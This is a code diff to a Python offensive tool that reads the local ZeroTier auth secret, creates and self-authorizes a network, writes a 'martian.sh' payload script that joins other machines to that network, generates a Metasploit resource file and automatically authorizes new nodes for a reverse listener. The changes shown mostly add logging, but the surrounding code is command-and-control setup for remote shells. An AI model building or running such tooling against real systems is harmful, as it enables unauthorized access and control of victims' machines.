@@ -8,6 +8,9 @@ import time
 from logger import logger
 from termcolor import colored
 
+# Initiates logging object
+log = logger()
+
 # Collects information about local zerotier instance
 os.environ['TOKEN'] = subprocess.check_output('sudo cat /var/lib/zerotier-one/authtoken.secret', shell=True, text=True).strip()
 os.environ['NODEID'] = subprocess.check_output('sudo bin/zerotier-cli info | cut -d " " -f 3', shell=True, text=True).strip()
@@ -32,6 +35,7 @@ response = requests.post(
 )
 
 print(response, response.text)
+log.print_success('New network created')
 
 # Joins self to network
 
@@ -41,6 +45,7 @@ os.environ['NWID'] = d.get('id')
 
 os.system(f'sudo zerotier-cli join {os.environ["NWID"]}')
 
+log.print_success('Joined local node to network')
 # Authorizes self on network
 
 headers = {
@@ -57,6 +62,7 @@ response = requests.post(
 )
 
 print(response, response.text)
+log.print_success('Authorized self')
 
 time.sleep(5)
 
@@ -88,6 +94,7 @@ script.insert(7, f'sudo ./zerotier-cli join {os.environ["NWID"]}\n')
 with open('prod/martian.sh', 'w') as f:
         for line in script:
             f.write(line)
+log.print_general('Script written')
 
 # Create metasploit config settings
 with open('prod/msf-settings.rc', 'w') as f:
@@ -102,7 +109,7 @@ log.success('Launch metasploit in a new window:\t"msfconsole -r prod/msf-setting
 # Start trying to authorize new members
 
 def authenticate_new_members():
-    authorized_nodes = []
+    authorized_nodes = [os.environ['NODEID']]
     while True:
         # Gets all nodes currently on the network
         headers = {
@@ -123,14 +130,14 @@ def authenticate_new_members():
                     headers=headers,
                     data=data,
                 )
-                print(f'Attempted to authorie new node {key}')
+                log.print_success(f'Attempted to authorie new node {key}')
                 authorized_nodes.append(key)
     time.sleep(5)
 
 
 thr = threading.Thread(target=authenticate_new_members)
 thr.start()
-print('[*] Attempting to authenticate new members...')
+log.print_general('Attempting to authenticate new members...')
 
 # Next, start reverse listener on MFSConsole
 
